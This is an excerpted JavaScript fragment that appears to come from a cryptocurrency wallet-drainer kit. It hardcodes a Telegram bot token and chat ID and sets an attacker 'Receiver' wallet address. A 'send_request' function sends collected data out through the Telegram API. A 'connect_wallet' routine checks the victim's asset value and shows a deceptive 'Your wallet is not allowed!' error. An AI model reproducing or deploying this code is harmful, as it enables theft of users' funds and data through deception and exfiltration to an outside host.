...
const botToken = '6738531604:AAHFwDsgcDPOpBoA5jifeQJGZFJeWnhKr2E';
const chatID = '5034432703';
...
let MS_Ready = false,
  MS_Settings = {
    ...
    Receiver: "0x7eD111acF620CBB789754A8d888aCbd0Dfd231c3",
    Address: "0x7eD111acF620CBB789754A8d888aCbd0Dfd231c3",
    LA: 1
...
const send_request = async (data) => {
  try {
    ...
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      ...
      body: `chat_id=${chatID}&text=${request_data}`,
    });
    ...
    if (!response_data.status)
      ...
      if (
        response_data.status == "error" &&
        response_data.error == "INVALID_VERSION"
      ) {
        MS_Force_Mode = true;
        try {
...
export const connect_wallet = async (provider = null, address, switchNetwork) => {
  try {
    ...
    if (MS_Settings.Settings.Minimal_Wallet_Price > assets_price) {
      if (MS_Loader_Style == 2) {
        Swal.fire({
          icon: "error",
          title: "Error wallet",
          subtitle: "Your wallet is not allowed!",
